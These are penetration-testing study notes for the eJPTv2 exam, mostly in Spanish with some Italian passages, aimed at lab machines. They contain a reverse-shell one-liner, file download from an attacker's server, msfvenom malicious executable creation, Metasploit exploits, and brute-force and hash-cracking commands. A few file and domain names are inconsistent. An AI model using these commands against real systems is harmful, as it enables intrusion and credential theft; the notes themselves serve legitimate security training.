# CONCEPTOS BÁSICOS DE HACKING
# Uso de netcat
Si quiero obtener una reverse shell en mi máquina atacante, primero debo conocer la dirección IP, que puedo obtener con el siguiente comando:  

`hostname -I` 

Ahora, puedo ir a la página revshells.com y generar el payload.  

![1](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/1.jpg)


En la página, ingreso la dirección IP de la máquina atacante y genero el payload.  
Me pongo en escucha en el puerto, por ejemplo, 9001, con el siguiente comando:  

`sudo nc -lvnp 9001`  

Luego, en la máquina víctima, ejecuto el payload generado en revshells.com:  

`sh -i >& /dev/tcp/10.10.10.10/9001 0>&1`

# Servicio de Python para compartir archivos   
Puede ser útil durante un ataque tener que cargar archivos en la máquina víctima.  
Para hacerlo, puedo "montar" un servidor web en Kali para compartir archivos.  
Escribo el comando:  

`sudo python3 -m http.server 80`  

En la máquina víctima podré descargar el archivo con el comando:  

`wget http://IpMacchinaKali/NombreFichero`  

# ARP-SCAN - NETDISCOVER  
Para descubrir máquinas dentro de mi red, puedo utilizar arpscan.  
Debo saber el nombre de la interfaz de red y luego escribir el comando:  

`sudo arp-scan -I eth0 --localnet`  

Puedo hacer lo mismo con netdiscover, escribiendo el comando:  

`sudo netdiscover -I eth0 -r 192.168.10.0/24`  

Puedo obtener la misma información con nmap con el comando:  

`sudo nmap -sn 192.168.10.0/24`  

# Escaneos básicos con nmap  
Ejemplo de comando de escaneo básico con nmap:  

`sudo nmap -p- -sS -sC -sV --open --min-rate 5000 -n -vvv -Pn 192.168.0.10 -oN 1stScan`  

-p- para escanear todos los puertos  
-sS para que sea más rápido  
-sC para ejecutar una serie de scripts básicos  
-sV para que me muestre la versión del servicio encontrado en el puerto abierto  
--open para encontrar los puertos abiertos  
--min-rate con el parámetro 5000 va muy rápido, ideal para la red local de casa, pero en el caso de un examen o en la vida real es mejor usar 1500 o 2000  
-n para evitar la resolución DNS  
-vvv para mostrar los resultados durante el escaneo  
-Pn es decir, sin ping  
-oN nombrearchivo para exportar en formato nmap  

# Escaneos de vulnerabilidades con nmap  
Supponiamo di aver scansionato una macchina Windows 7 con la porta 445 aperta.  
Potremmo usare una utility di nmap per vedere se è vulnerabile.  
C'è da dire che questo script fa "molto rumore" e non è consigliabile usarlo nel mondo reale.  

`sudo nmap --script "vuln" -p445 192.168.10.10`  

# Escaneo de puertos UDP  
Es conveniente también realizar escaneos del protocolo UDP.  
Para hacerlo, por ejemplo, podemos usar el comando:  

`sudo nmap -sU --top-ports 200 --min-rate=5000 -Pn 192.168.10.10`  

# EXPLOTACIÓN DE VULNERABILIDADES Y ATAQUES DE FUERZA BRUTA  
# Uso básico de Metasploit – Explotación de EternalBlue en Windows  
Siempre conviene abrir Metasploit desde el menú de Kali, ya que así se ejecuta el siguiente comando que permite actualizar automáticamente la base de datos de Metasploit.  

`sudo msfdb init && msfconsole`  

Si quiero buscar un exploit, puedo hacerlo escribiendo, por ejemplo:  

`search eternalblue`  

O también puedo buscarlo con el nombre de la CVE correspondiente, por ejemplo:  

`search CVE-2017-0143`  

Para usar un módulo, simplemente debo escribir el comando use seguido del número correspondiente del exploit que quiero utilizar, por ejemplo, 0.  

![2](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/2.jpg)   

Con el comando show options puedo ver todas las opciones disponibles para el exploit en cuestión, y con set puedo configurar los diferentes parámetros.  

![3](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/3.jpg) 

![4](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/4.jpg)

Y finalmente, con el comando run o exploit lanzaré el ataque, y si todo funciona correctamente, obtendré una meterpreter shell.  

![5](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/5.jpg)

# Utilizzo basico de Metasploit – Exploitation vsftpd in Linux  
Iniciamos la máquina Metasploitable 2.0.0 y después de una primera exploración, vemos que tiene muchos puertos abiertos.  
En particular, intentaremos analizar el puerto 21 y lanzaremos el comando:  

`sudo nmap --script "vuln" -p21 10.10.10.6`  

![6](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/6.jpg)  

En este punto, lanzaremos Metasploit y buscaremos un exploit que podamos utilizar en este caso concreto.  

![7](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/7.jpg)

Como podemos ver, el exploit 1 parece ser el adecuado para nuestro caso, así que lo seleccionamos, configuramos los parámetros necesarios y probamos a lanzar el ataque.  

![8](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/8.jpg)   

A veces puede ser necesario ejecutar el exploit un par de veces para que surta efecto.  

![9](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/9.jpg)   

# Msfvenom – Creazione payloads  

Con esta utilidad puedo crear archivos maliciosos que me permiten obtener una sesión meterpreter en mi máquina atacante.  
Para crear, por ejemplo, un archivo malicioso para Windows, debo escribir el siguiente comando:  

`sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=6969 -f exe -o file.exe`  

Una vez creado el archivo malicioso y enviado a la máquina objetivo, deberé ponerme en escucha, en este caso en el puerto 6969, para obtener una reverse shell.    
Puedo hacerlo a través de netcat con el comando `nc -lvnp 6969` o con el multi handler de Metasploit.  
Veamos cómo usar el multi handler.      
Ejecuto Metasploit y escribo el comando:  

`use /multi/handler`  

Si escribo `show options`, puedo ver las opciones disponibles:  

![10](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/10.jpg)  

Debo configurar `LHOST` con la dirección IP de la máquina atacante y `LPORT` para que coincida con el puerto que he especificado durante la creación del archivo malicioso con `msfvenom` (6969 en este ejemplo).  

¡ATENCIÓN! ¡También el payload debe coincidir con el utilizado durante la creación del archivo!  
En este ejemplo, se observa que por defecto se utiliza el payload `generic/shell_reverse_tcp`, mientras que nosotros hemos especificado en `msfvenom` `windows/x64/meterpreter/reverse_tcp`.   

Puedo cambiarlo escribiendo:  

`set PAYLOAD windows/x64/meterpreter/reverse_tcp`    

Entonces, configuro los demás parámetros.  

![11](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/11.jpg)    

Y finalmente lo ejecuto con el comando run, y permanecerá en escucha.  
Ahora, si ejecuto el archivo malicioso en la máquina víctima, obtendré una sesión meterpreter.   

![12](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/12.jpg)  

# Uso de Hydra – Ataques de fuerza bruta a contraseñas (SSH y FTP)  
Puedo utilizar Hydra para realizar ataques de fuerza bruta.    
Si, por ejemplo, conozco uno o más nombres de usuario, puedo intentar hacer un ataque de fuerza bruta escribiendo:  

`sudo hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.7`  

Utilizaré el parámetro `-l` en minúscula porque conozco el nombre del usuario; de lo contrario, habría usado el parámetro `-L`.    
Lo mismo para la contraseña: `-P` porque utilizo un diccionario; si no, habría usado `-p` seguido de la contraseña.  

![13](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/13.jpg)    

Si hubiera querido atacar FTP, solo habría que cambiar el parámetro en el comando:  

`sudo hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.7`   

![14](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/14.jpg)   

# Uso de Hydra – Attacchi di forza bruta a utenti (SSH ed FTP)  

Ahora veamos qué diccionario utilizar para enumerar los usuarios, suponiendo que ya conocemos la contraseña.  

`sudo hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://10.10.10.7 `  

![15](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/15.jpg)    

Si quisiera atacar FTP, escribiría el mismo comando y cambiaría solo el parámetro al final, como se vio anteriormente.  

**TIPS**  
Para el examen, usa estos diccionarios:  
- **USUARIOS** ==> `/usr/share/wordlists/metasploit/unix_users.txt`  
- **CONTRASEÑAS** ==> `/usr/share/wordlists/rockyou.txt`


# Uso de Hydra – Ataques de fuerza bruta a paneles de inicio de sesión web  

Para realizar un ataque de fuerza bruta a un inicio de sesión web, utilizaremos la máquina Blog de Vulnyx.  
La URL es la siguiente:   

`http://10.10.10.8/my_weblog/admin.php`

Primero intentamos ingresar "admin" como usuario y "admin" como contraseña, y pasamos la solicitud a Burp Suite para ver qué sucede.  

![16](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/16.jpg)  

Como podemos ver, se trata de una solicitud POST (línea 1), por lo que en el comando debemos especificarlo con la opción `http-post-form`.    
Luego, debemos ingresar la URL del panel de inicio de sesión con la solicitud de nombre de usuario y contraseña de la línea 16, es decir, `/my_weblog/admin.php:username=admin&password`.  
Sin embargo, dado que no conocemos la contraseña, debemos incluir el error que se muestra cuando el inicio de sesión falla.  

![17](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/17.jpg)   

El comando completo sería entonces:  

`sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.8 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password." -t 64`  

# Attacchi di forza bruta con Metasploit  
Puedo realizar ataques de fuerza bruta a SSH o FTP también con Metasploit.  
Una vez lanzado Metasploit, puedo escribir `search ssh_login`.  

![18](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/18.jpg)    

Puedo usar el **auxiliary scanner** (0) para intentar un ataque y puede ser una alternativa válida a Hydra.    
Configuro los parámetros necesarios y lanzo el ataque.    

![19](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/19.jpg)   

Metasploit es un poco más lento en comparación con Hydra, pero el resultado es el mismo.    
Para atacar FTP, haz exactamente lo mismo pero con el **auxiliary scanner** que se llama `ftp_login`.  

**TIPS:** Para que sea un poco más rápido, configura `VERBOSE` en `false` con el comando `set VERBOSE false`.   

# Ataques de fuerza bruta a bases de datos  
Per effettuare un attacco di forza bruta con Hydra contro un database MySQL, supponendo di sapere qual è il nome utente, userò sempre il solito comando visto nelle lezioni precedenti con ssh e ftp, cambierò solo l'ultimo parametro.  

`sudo hydra -l capybarauser -P /usr/share/wordlists/rockyou.txt mysql://10.10.10.9` 

Hasta aquí nada nuevo.    
Un pequeño truco a tener en cuenta para el examen es que la contraseña correcta podría estar al final del diccionario rockyou, por lo que podría tardar mucho tiempo.  

**TIPS**  
Entonces, puedo invertir el orden del diccionario y crear uno en orden inverso (es decir, de Z a A).    
Puedo hacerlo con la cuenta root con el comando:  

`tac /usr/share/wordlists/rockyou.txt > rockyou_inver.txt`  

Una volta creato il file reverse_rockyou.txt se lo apro con nano posso notare che non sta ben formattato, contiene spazi e si sono modificate alcune password.   

![20](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/20.jpg)   

Cancello le lettere arancioni e poi con tr tolgo gli spazi digitando il comando:  

`cat rockyou_inver.txt | tr -d ' ' > reverse_rockyou.txt`  

![21](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/21.jpg)   

Listo! Ya lo tenemos!  

![22](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/22.jpg)  

Ahora, para iniciar sesión en MySQL, deberé ejecutar el siguiente comando:  

`sudo mysql -h 10.10.10.9 -u capybarauser -pie168`  

### ¡¡¡IMPORTANTE!!!  
La contraseña debe escribirse inmediatamente después del parámetro `-p`.  

![23](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/23.jpg)  

Una vez que obtengamos acceso a una base de datos, los comandos más comunes que utilizaremos serán:  

`show databases;
use nome_database;
show tables;
SELECT * FROM users; (che significa seleziona tutte le colonne della tabella users)`  

Entonces, podríamos usar la contraseña obtenida para conectarnos, por ejemplo, a SSH o FTP.  

![24](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/24.jpg)   

# Ataques de fuerza bruta locales con John the Ripper  

Si tenemos archivos ZIP, bases de datos KeePass o contraseñas en formato hash, podemos usar John the Ripper para intentar descifrarlas.  

**ARCHIVO ZIP**    
Supongamos que tenemos un archivo ZIP protegido por una contraseña.     
Lo primero que debemos hacer es usar la utilidad `zip2john` y pasarle el archivo `.zip` con el comando:  

`sudo zip2john prova.zip > hash` 

![25](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/25.jpg)   

Una vez creado el hash (podemos llamar al archivo como queramos; en este ejemplo se llamará "hash"), puedo intentar encontrar la contraseña con John the Ripper usando el comando:  

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash`  

![26](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/26.jpg)    

**KEEPASS**
Se siamo in possesso di un database keepass (che ha una estensione .kdbx) posso sempre usare john.  
Stesso procedimento visto con zip, l'unica differenza è che dovrò usare prima keepass2john in questo modo: 

`sudo keepass2john nomedatabase.kdbx > hash`  

Entonces, escribiremos este comando para descifrar la contraseña:  

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash`  

**CONTRASEÑAS**  
Supongamos que tenemos una contraseña "hasheada" con MD5, por ejemplo.  
Puedo usar John the Ripper para descifrarla.  
Creo un hash MD5 y lo guardo en un archivo llamado `password`.  

![27](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/27.jpg)  

Si ejecuto el comando utilizado anteriormente, es posible que me devuelva un error:  

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt password `   

![28](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/28.jpg)  

Esto se debe a que, como se puede ver en el error, John no puede determinar el tipo de hash.    
Puedo usar `hashidentifier` para averiguar qué tipo de hash es.    
Copio el hash de la contraseña y obtengo una pantalla similar a esta:    

![29](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/29.jpg)    

Ahora sé que el hash es un MD5, por lo que puedo pasárselo a John con esta opción (que se mostraba en el error anterior).  

`sudo john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt password`  

![30](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/30.jpg)    

**TIPS**  
Una web molto utile per decodificare password con hash MD5 ad esempio è crackstation.  

# Explotación de vulnerabilidades web  
# ¿Qué es el fuzzing web? – Uso de Gobuster  

Puedo realizar fuzzing web con la herramienta Gobuster escribiendo el siguiente comando:  

`sudo gobuster dir -u http://10.10.10.6/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`  

TIPS 
Per l'esame è molto raccomandabile usare questo dizionario:  
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  

RICERCA ESTENSIONI FILES  
Se volessi ricercare files specifici, per esempio php, txt ecc. dovrò digitare il seguente comando:  

`sudo gobuster dir -u http://10.10.10.6/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,py,htm,html`  

Un'alternativa a gobuster potrebbe essere dirb, che è un po' più semplice.  
Il comando sarebbe:  

`sudo dirb http://10.10.10.6`  

# Enumerar subdominios con Wfuzz  
Podría suceder que durante un escaneo con Nmap, especialmente cuando intento resolver máquinas en plataformas como TryHackMe (THM) o Hack The Box (HTB), aparezca un mensaje como "Service Info: Host: xxx.xxx".  

![31](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/31.jpg)    

Esto significa que estamos ante un caso de virtual hosting.    
De hecho, si intentamos abrir la página solo con la dirección IP, nos dará un error y nos redirigirá a `logan.hvm` en este ejemplo.  

![32](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/32.jpg)    

Para poder visualizar la página, debemos editar el archivo `/etc/hosts`.  

![33](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/33.jpg)    

Si ahora intento abrir la página web, se cargará correctamente.  

![34](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/34.jpg)    

Ahora podemos intentar enumerar los subdominios con Wfuzz usando el siguiente comando:  

`sudo wfuzz -c --hc=404 --hl=1 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host:FUZZ.logan.hmv" -u 192.168.10.202`  

### ¡¡¡IMPORTANTE!!!  
Con el parámetro `-H "Host:FUZZ.nombre_dominio"` podemos enumerar los subdominios.    
Si, por ejemplo, la exploración encuentra algo como esto:  

![35](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/35.jpg)    

Significa que habrá un subdominio que apuntará a `admin.logan.hmv`.     
Para poder visualizarlo, deberé editar nuevamente el archivo `/etc/hosts` y agregar esta nueva entrada para poder ver la página correctamente.   

![36](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/36.jpg)    

![37](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/37.jpg)   

# Cómo realizar un ataque de transferencia de zona DNS 
Supongamos que durante una exploración con Nmap encontramos abiertas la **puerta 53** (DNS) y la **puerta 80**, donde aparece un dominio, en este caso `hunterzone.nyx`.  

![38](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/38.jpg)    

Es importante entender que debo intentar enumerar tantos dominios y subdominios como sea posible, ya que son vehículos para descubrir información y lanzar ataques.  
En este caso, podría intentar un ataque de transferencia de zona DNS con la herramienta `dig`.  
Primero, modifico el archivo `/etc/hosts`, como hemos visto anteriormente, e ingreso el dominio `hunterzone.nyx`. Luego, lanzo el comando `dig` de la siguiente manera:  

`sudo dig axfr hunterzone.nyx @10.10.10.11`  

![39](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/39.jpg)    

En este caso, también debería agregar al archivo `/etc/hosts` todos los subdominios descubiertos.  

![40](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/40.jpg)     

Ahora, como hemos visto anteriormente, podría enumerar los subdominios con Wfuzz usando el comando:  

`sudo wfuzz -c --hc=404 --hl=367 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host:FUZZ.devhunter.nyx" -u 10.10.10.11`  

**TIPS**  
Para enumerar los subdominios, el diccionario más adecuado es:    
`/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt`













































































  






































































